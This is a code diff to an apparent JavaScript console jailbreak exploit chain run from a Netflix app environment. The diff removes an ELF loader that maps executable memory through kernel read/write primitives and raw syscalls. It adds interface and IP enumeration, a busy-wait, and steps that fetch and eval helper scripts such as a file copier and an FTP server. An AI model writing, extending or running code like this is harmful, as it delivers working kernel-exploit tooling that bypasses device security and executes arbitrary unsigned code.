@@ -1491,6 +1491,12 @@ function main () {
             return amaj === bmaj ? amin - bmin : amaj - bmaj;
         }
 
+
+        function sleepFor(sleepDuration) {
+            var now = new Date().getTime();
+            while(new Date().getTime() < now + sleepDuration){ /* Do nothing */ }
+        }
+
         /***** Let's trigger Jailbreak *****/
 
         FW_VERSION = get_fwversion();
@@ -1508,116 +1514,62 @@ function main () {
                 return;
             }
 
-            // ELF loader - synchronous, uncompressed r/w (required in Netflix env)
-            const ELF_SHADOW_MAPPING_ADDR = 0x920100000n;
-            const ELF_MAPPING_ADDR        = 0x926100000n;
+            eval(script);
+            logger.flush();
 
-            function elf_parse(elf_data) {
-                // elf_data is either a Uint8Array (from read_file/USB) or a BigInt kernel address (from fetch_file/proxy)
-                let elf_store;
-                if (typeof elf_data === 'bigint') {
-                    elf_store = elf_data;
-                } else {
-                    elf_store = malloc(elf_data.length);
-                    write_buffer(elf_store, elf_data);
+            function get_current_ip() {
+                // Get interface count
+                const count = Number(syscall(SYSCALL.netgetiflist, 0n, 10n));
+                if (count < 0) {
+                    return null;
                 }
 
-                const SIZE_PH = 0x38n, SIZE_SH = 0x40n, RELA_SZ = 0x18n;
+                // Allocate buffer for interfaces
+                const iface_size = 0x1e0;
+                const iface_buf = malloc(iface_size * count);
 
-                const elf_entry = read64_uncompressed(elf_store + 0x18n);
-                const phoff     = read64_uncompressed(elf_store + 0x20n);
-                const shoff     = read64_uncompressed(elf_store + 0x28n);
-                const phnum     = read16_uncompressed(elf_store + 0x38n);
-                const shnum     = read16_uncompressed(elf_store + 0x3cn);
+                // Get interface list
+                if (Number(syscall(SYSCALL.netgetiflist, iface_buf, BigInt(count))) < 0) {
+                    return null;
+                }
 
-                let exec_start = 0n, exec_end = 0n;
+                // Parse interfaces
+                for (let i = 0; i < count; i++) {
+                    const offset = BigInt(i * iface_size);
 
-                for (let i = 0n; i < phnum; i++) {
-                    const ph      = elf_store + phoff + i * SIZE_PH;
-                    const p_type  = read32_uncompressed(ph + 0x00n);
-                    const p_flags = read32_uncompressed(ph + 0x04n);
-                    const p_off   = read64_uncompressed(ph + 0x08n);
-                    const p_vaddr = read64_uncompressed(ph + 0x10n);
-                    const p_memsz = read64_uncompressed(ph + 0x28n);
-                    const aligned = (p_memsz + 0x3FFFn) & ~0x3FFFn;
+                    // Read interface name (null-terminated string at offset 0)
+                    let iface_name = "";
+                    for (let j = 0; j < 16; j++) {
+                        const c = Number(read8_uncompressed(iface_buf + offset + BigInt(j)));
+                        if (c === 0) break;
+                        iface_name += String.fromCharCode(c);
+                    }
 
-                    if (p_type !== 0x01n) continue;  // PT_LOAD only
+                    // Read IP address (4 bytes at offset 0x28)
+                    const ip_offset = offset + 0x28n;
+                    const ip1 = Number(read8_uncompressed(iface_buf + ip_offset));
+                    const ip2 = Number(read8_uncompressed(iface_buf + ip_offset + 1n));
+                    const ip3 = Number(read8_uncompressed(iface_buf + ip_offset + 2n));
+                    const ip4 = Number(read8_uncompressed(iface_buf + ip_offset + 3n));
+                    const iface_ip = ip1 + "." + ip2 + "." + ip3 + "." + ip4;
 
-                    if (p_flags & 0x1n) {  // executable segment
-                        exec_start = p_vaddr;
-                        exec_end   = p_vaddr + p_memsz;
-
-                        const exec_h  = syscall(SYSCALL.jitshm_create, 0n, aligned, 0x7n);
-                        const write_h = syscall(SYSCALL.jitshm_alias, exec_h, 0x3n);
-
-                        syscall(SYSCALL.mmap, ELF_SHADOW_MAPPING_ADDR, aligned,
-                                PROT_READ | PROT_WRITE, 0x11n, write_h, 0n);
-                        for (let j = 0n; j < p_memsz; j++)
-                            write8_uncompressed(ELF_SHADOW_MAPPING_ADDR + j,
-                                                read8_uncompressed(elf_store + p_off + j));
-
-                        syscall(SYSCALL.mmap, ELF_MAPPING_ADDR + p_vaddr, aligned,
-                                PROT_READ | PROT_WRITE | PROT_EXEC, 0x11n, exec_h, 0n);
-                    } else {
-                        syscall(SYSCALL.mmap, ELF_MAPPING_ADDR + p_vaddr, aligned,
-                                PROT_READ | PROT_WRITE, 0x1012n, 0xFFFFFFFFn, 0n);
-                        for (let j = 0n; j < p_memsz; j++)
-                            write8_uncompressed(ELF_MAPPING_ADDR + p_vaddr + j,
-                                                read8_uncompressed(elf_store + p_off + j));
+                    // Check if this is eth0 or wlan0 with valid IP
+                    if ((iface_name === "eth0" || iface_name === "wlan0") &&
+                        iface_ip !== "0.0.0.0" && iface_ip !== "127.0.0.1") {
+                        return iface_ip;
                     }
                 }
 
-                // Apply R_X86_64_RELATIVE relocations
-                for (let i = 0n; i < shnum; i++) {
-                    const sh      = elf_store + shoff + i * SIZE_SH;
-                    const sh_type = read32_uncompressed(sh + 0x04n);
-                    const sh_off  = read64_uncompressed(sh + 0x18n);
-                    const sh_size = read64_uncompressed(sh + 0x20n);
-                    if (sh_type !== 0x4n) continue;  // SHT_RELA only
-                    const count = sh_size / RELA_SZ;
-                    for (let j = 0n; j < count; j++) {
-                        const r     = elf_store + sh_off + j * RELA_SZ;
-                        const r_off = read64_uncompressed(r + 0x00n);
-                        const r_inf = read64_uncompressed(r + 0x08n);
-                        const r_add = read64_uncompressed(r + 0x10n);
-                        if ((r_inf & 0xFFn) !== 0x08n) continue;
-                        let dst = ELF_MAPPING_ADDR + r_off;
-                        if (r_off >= exec_start && r_off < exec_end)
-                            dst = ELF_SHADOW_MAPPING_ADDR + r_off;
-                        write64_uncompressed(dst, ELF_MAPPING_ADDR + r_add);
-                    }
-                }
-
-                return ELF_MAPPING_ADDR + elf_entry;
+                return null;
             }
 
-            function elf_run(entry, path) {
-                const rwpipe = malloc(8), rwpair = malloc(8);
-                const args   = malloc(0x30), thr_buf = malloc(8), payloadout = malloc(4);
+            logger.log("Waiting 20s...");
+            sleepFor(20000);
 
-                write32_uncompressed(rwpipe,      ipv6_kernel_rw.data.pipe_read_fd);
-                write32_uncompressed(rwpipe + 4n, ipv6_kernel_rw.data.pipe_write_fd);
-                write32_uncompressed(rwpair,      ipv6_kernel_rw.data.master_sock);
-                write32_uncompressed(rwpair + 4n, ipv6_kernel_rw.data.victim_sock);
-
-                write64_uncompressed(args + 0x00n, syscall_wrapper - 7n);
-                write64_uncompressed(args + 0x08n, rwpipe);
-                write64_uncompressed(args + 0x10n, rwpair);
-                write64_uncompressed(args + 0x18n, ipv6_kernel_rw.data.pipe_addr);
-                write64_uncompressed(args + 0x20n, kernel.addr.data_base);
-                write64_uncompressed(args + 0x28n, payloadout);
-
-                const ret = call(Thrd_create, thr_buf, entry, args);
-                if (ret !== 0n) throw new Error("Thrd_create failed: " + toHex(ret));
-
-                const thr_handle = read64_uncompressed(thr_buf);
-                return { thr_handle, payloadout };
-            }
-
-            function elf_wait_for_exit(thr_handle, payloadout) {
-                const ret = call(Thrd_join, thr_handle, 0n);
-                if (ret !== 0n) throw new Error("Thrd_join failed: " + toHex(ret));
-            }
+            send_notification("file_copier.js");
+            script = get_script("file_copier.js");
+            //send_notification("ftpserver.js");
+            //script = get_script("ftpserver.js");
 
             eval(script);
             logger.flush();
